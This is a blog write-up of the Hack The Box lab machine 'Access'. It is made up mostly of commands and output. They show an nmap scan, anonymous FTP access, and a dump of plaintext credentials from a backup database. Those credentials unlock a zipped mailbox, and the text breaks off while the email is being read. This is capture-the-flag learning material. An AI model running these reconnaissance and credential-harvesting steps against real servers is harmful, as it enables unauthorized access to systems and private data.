<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><link href=http://gmpg.org/xfn/11 rel=profile><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Access: Hack The Box writeup &#183; Jamie Magee</title><link rel=preload href=/css/poole.css as=style><link rel=preload href=/css/hyde.css as=style><link rel=preload href=/css/poole-overrides.css as=style><link rel=preload href=/css/hyde-overrides.css as=style><link rel=preload href=/css/hyde-x.css as=style><link rel=preload href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface" as=font><link rel=preload href=https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css as=style><link rel=stylesheet href=/css/poole.css><link rel=stylesheet href=/css/hyde.css><link rel=stylesheet href=/css/poole-overrides.css><link rel=stylesheet href=/css/hyde-overrides.css><link rel=stylesheet href=/css/hyde-x.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface"><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css><style>@font-face{font-family:berkeley mono;src:url(/fonts/BerkeleyMono-Regular.woff2)format('woff2')}</style><link rel=stylesheet href=/css/jamie.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/apple-touch-icon-144-precomposed.png><link href=/favicon.ico rel=icon><meta name=description content><meta name=keywords content><meta property="og:title" content="Access: Hack The Box writeup"><meta property="og:description" content="Recently I discovered Hack The Box, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called Access. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!
Information gathering Let&rsquo;s start with an nmap scan to see what services are running on the box.
1# nmap -n -v -Pn -p- -A --reason -oN nmap."><meta property="og:type" content="article"><meta property="og:url" content="/blog/access-htb-writeup/"><meta property="article:section" content="blog"><meta property="article:published_time" content="2019-03-02T00:00:00+00:00"><meta property="article:modified_time" content="2019-03-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Access: Hack The Box writeup"><meta name=twitter:description content="Recently I discovered Hack The Box, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called Access. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!
Information gathering Let&rsquo;s start with an nmap scan to see what services are running on the box.
1# nmap -n -v -Pn -p- -A --reason -oN nmap."></head><body class=theme-base-0c><div class=sidebar><div class="container sidebar-sticky"><div class=sidebar-about><div class=sidebar-head><h1><a href=/>Jamie Magee</a></h1></div><p class=lead>Programmer, Engineer, Problem Solver</p></div><ul class=sidebar-nav><li class=sidebar-nav-item><a href=/>Home</a></li><li class=sidebar-nav-item><a href=/about>About</a></li><li class=sidebar-nav-item><a href=/blog>Archive</a></li></ul><ul class=sidebar-nav><li class=sidebar-nav-item><a href=https://github.com/JamieMagee><i class="fa fa-github-square fa-3x"></i></a>
<a href=https://www.linkedin.com/in/jamiemagee1/><i class="fa fa-linkedin-square fa-3x"></i></a>
<a href=http://twitter.com/Jamie_Magee><i class="fa fa-twitter-square fa-3x"></i></a></li></ul><p>&copy; 2023. <a href=https://creativecommons.org/licenses/by-nc/4.0/>CC BY-NC 4.0</a></p></div></div><div class="content container"><div class=post><h1 class=post-title>Access: Hack The Box writeup</h1><span class=post-date>Mar 2, 2019 &#183; 8 minute read &#183; <a href=/blog/access-htb-writeup/#disqus_thread>Comments</a></span><p><a href=https://www.hackthebox.eu/home/machines/profile/156><img src=/img/access-info.png alt="Access info page"></a></p><p>Recently I discovered <a href=https://www.hackthebox.eu/home>Hack The Box</a>, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called <a href=https://www.hackthebox.eu/home/machines/profile/156>Access</a>. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!</p><h2 id=information-gathering>Information gathering</h2><p>Let&rsquo;s start with an <code>nmap</code> scan to see what services are running on the box.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>21/tcp open  ftp     syn-ack Microsoft ftpd
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>| ftp-anon: Anonymous FTP login allowed <span style=color:#000;font-weight:700>(</span>FTP code 230<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>|_Can<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>t get directory listing: TIMEOUT
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>| ftp-syst:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>|_  SYST: Windows_NT
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd <span style=color:#000;font-weight:700>(</span>no more connections allowed<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>| http-methods:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>|_http-title: MegaCorp
</span></span></code></pre></div><p><code>nmap</code> has found three services running: FTP, telnet, and an HTTP server. Let&rsquo;s see what&rsquo;s running on the HTTP server.</p><p><img src=/img/htb-access-http.png alt></p><p>It&rsquo;s just a static page, showing an image. Nothing interesting, so let&rsquo;s move on for now.</p><h2 id=anonymous-ftp>Anonymous FTP</h2><p><code>nmap</code> showed that there is an FTP server running, with anonymous login allowed. Let&rsquo;s see what&rsquo;s on that server</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># ftp 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>Connected to 10.10.10.98.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#099>220</span> Microsoft FTP Service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>Name <span style=color:#000;font-weight:700>(</span>10.10.10.98:root<span style=color:#000;font-weight:700>)</span>: anonymous
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#099>331</span> Anonymous access allowed, send identity <span style=color:#000;font-weight:700>(</span>e-mail name<span style=color:#000;font-weight:700>)</span> as password.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>Password:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>230</span> User logged in.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>Remote system <span style=color:#0086b3>type</span> is Windows_NT.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>ftp&gt; ls
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>200</span> PORT <span style=color:#0086b3>command</span> successful.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>125</span> Data connection already open; Transfer starting.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>08-23-18  08:16PM       &lt;DIR&gt;          Backups
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>08-24-18  09:00PM       &lt;DIR&gt;          Engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>226</span> Transfer complete.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>ftp&gt; ls Backups
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>200</span> PORT <span style=color:#0086b3>command</span> successful.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>125</span> Data connection already open; Transfer starting.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>08-23-18  08:16PM              <span style=color:#099>5652480</span> backup.mdb
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#099>226</span> Transfer complete.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>ftp&gt; ls Engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#099>200</span> PORT <span style=color:#0086b3>command</span> successful.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#099>125</span> Data connection already open; Transfer starting.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>08-24-18  12:16AM                <span style=color:#099>10870</span> Access Control.zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#099>226</span> Transfer complete.
</span></span></code></pre></div><p>There are some interesting files here, let&rsquo;s download them and analyse them</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># wget ftp://anonymous:anonymous@10.10.10.98 --no-passive-ftp --mirror</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>--2019-02-02 15:37:26--  ftp://anonymous:*password*@10.10.10.98/
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>           <span style=color:#000;font-weight:700>=</span>&gt; ‘10.10.10.98/.listing’
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Connecting to 10.10.10.98:21... connected.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>Logging in as anonymous ... Logged in!
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>FINISHED --2019-02-02 15:37:28--
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>Total wall clock time: 1.8s
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span><span>Downloaded: <span style=color:#099>5</span> files, 5.4M in 1.4s <span style=color:#000;font-weight:700>(</span>3.99 MB/s<span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><h2 id=microsoft-access>Microsoft Access</h2><p>We&rsquo;ve got a <code>.mdb</code> file—which is a Microsoft Access database file—and a zip file. If we take a quick look at the zip file it&rsquo;s password protected. We&rsquo;ll have to come back the that later.</p><p>We can examine <code>backup.mdb</code> using MDB tools. Maybe there&rsquo;s something we can use there.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># mdb-tables Backups/backup.mdb</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
</span></span></code></pre></div><p>It looks like there&rsquo;s a lot of autogenerated tables here, but those <code>auth_*</code> tables look interesting.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># mdb-export Backups/backup.mdb auth_user</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>id,username,password,Status,last_login,RoleID,Remark
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>25,<span style=color:#d14>&#34;admin&#34;</span>,<span style=color:#d14>&#34;admin&#34;</span>,1,<span style=color:#d14>&#34;08/23/18 21:11:47&#34;</span>,26,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>27,<span style=color:#d14>&#34;engineer&#34;</span>,<span style=color:#d14>&#34;access4u@security&#34;</span>,1,<span style=color:#d14>&#34;08/23/18 21:13:36&#34;</span>,26,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>28,<span style=color:#d14>&#34;backup_admin&#34;</span>,<span style=color:#d14>&#34;admin&#34;</span>,1,<span style=color:#d14>&#34;08/23/18 21:14:02&#34;</span>,26,
</span></span></code></pre></div><p>Awesome! So we&rsquo;ve got some credentials for <code>engineer</code>, and we&rsquo;ve got a password protected zip file in the <code>Engineer</code> directory.</p><h2 id=microsoft-outlook>Microsoft Outlook</h2><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># 7z x Access\ Control.zip</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>7-Zip <span style=color:#000;font-weight:700>[</span>64<span style=color:#000;font-weight:700>]</span> 16.02 : Copyright <span style=color:#000;font-weight:700>(</span>c<span style=color:#000;font-weight:700>)</span> 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>p7zip Version 16.02 <span style=color:#000;font-weight:700>(</span><span style=color:teal>locale</span><span style=color:#000;font-weight:700>=</span>en_GB.UTF-8,Utf16<span style=color:#000;font-weight:700>=</span>on,HugeFiles<span style=color:#000;font-weight:700>=</span>on,64 bits,2 CPUs Intel<span style=color:#000;font-weight:700>(</span>R<span style=color:#000;font-weight:700>)</span> Core<span style=color:#000;font-weight:700>(</span>TM<span style=color:#000;font-weight:700>)</span> i7-7820HQ CPU @ 2.90GHz <span style=color:#000;font-weight:700>(</span>906E9<span style=color:#000;font-weight:700>)</span>,ASM,AES-NI<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>Scanning the drive <span style=color:#000;font-weight:700>for</span> archives:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>1</span> file, <span style=color:#099>10870</span> bytes <span style=color:#000;font-weight:700>(</span><span style=color:#099>11</span> KiB<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>Extracting archive: Access Control.zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>--
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:teal>Path</span> <span style=color:#000;font-weight:700>=</span> Access Control.zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:teal>Type</span> <span style=color:#000;font-weight:700>=</span> zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>Physical <span style=color:teal>Size</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#099>10870</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>Enter password <span style=color:#000;font-weight:700>(</span>will not be echoed<span style=color:#000;font-weight:700>)</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>Everything is Ok
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>Size:       <span style=color:#099>271360</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>Compressed: <span style=color:#099>10870</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#998;font-style:italic># ls</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#d14>&#39;Access Control.pst&#39;</span>  <span style=color:#d14>&#39;Access Control.zip&#39;</span>
</span></span></code></pre></div><p>That worked! Now we&rsquo;ve got the mailbox backup for the engineer, but we first need to convert it to something that we can read more easily on Linux.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># readpst Access\ Control.pst</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Opening PST file and indexes...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>Processing Folder <span style=color:#d14>&#34;Deleted Items&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>	<span style=color:#d14>&#34;Access Control&#34;</span> - <span style=color:#099>2</span> items <span style=color:#000;font-weight:700>done</span>, <span style=color:#099>0</span> items skipped.
</span></span></code></pre></div><p>Let&rsquo;s take a peek at the engineer&rsquo;s mailbox</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># mail -f Access\ Control.mbox</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>mail version v14.9.11.  Type <span style=color:#d14>`</span>?<span style=color:#d14>&#39; for help
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#d14>&#39;</span>/root/10.10.10.98/Engineer/Access Control.mbox<span style=color:#d14>&#39;: 1 message
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#d14>▸O  1 john@megacorp.com  2018-08-23 23:44   87/3112  MegaCorp Access Control System &#34;security&#34; account
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#d14>?
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#d14>[-- Message  1 -- 87 lines, 3112 bytes --]:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#d14>From &#34;john@megacorp.com&#34; Thu Aug 23 23:44:07 2018
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#d14>From: john@megacorp.com &lt;john@megacorp.com&gt;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#d14>Subject: MegaCorp Access Control System &#34;security&#34; account
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#d14>To: &#39;</span>security@accesscontrolsystems.com<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>Date: Thu, <span style=color:#099>23</span> Aug <span style=color:#099>2018</span> 23:44:07 +0000
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#000;font-weight:700>[</span>-- <span style=color:#998;font-style:italic>#1.1 73/2670 multipart/alternative --]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#000;font-weight:700>[</span>-- <span style=color:#998;font-style:italic>#1.1.1 15/211 text/plain, 7bit, utf-8 --]</span>
